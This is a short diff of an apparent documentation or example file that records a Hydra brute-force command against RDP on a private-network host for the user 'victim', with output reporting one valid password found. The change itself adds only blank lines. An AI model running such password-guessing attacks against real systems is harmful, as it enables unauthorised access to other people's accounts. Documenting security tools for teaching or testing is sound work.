@@ -9,6 +9,7 @@ output: 'root@kali:~# hydra -t 1 -f -l victim -P wordlist.txt rdp://10.0.1.105
   Hydra v9.1-dev (c) 2019 by van Hauser/THC & David Maciejak - Please do not use in
   military or secret service organizations, or for illegal purposes.
 
+
   Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-24 21:05:23
 
   [WARNING] the rdp module is experimental. Please test, report - and if possible,
@@ -51,3 +52,5 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-24 21:05:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-09-24 21:05:26
 ```
+
+
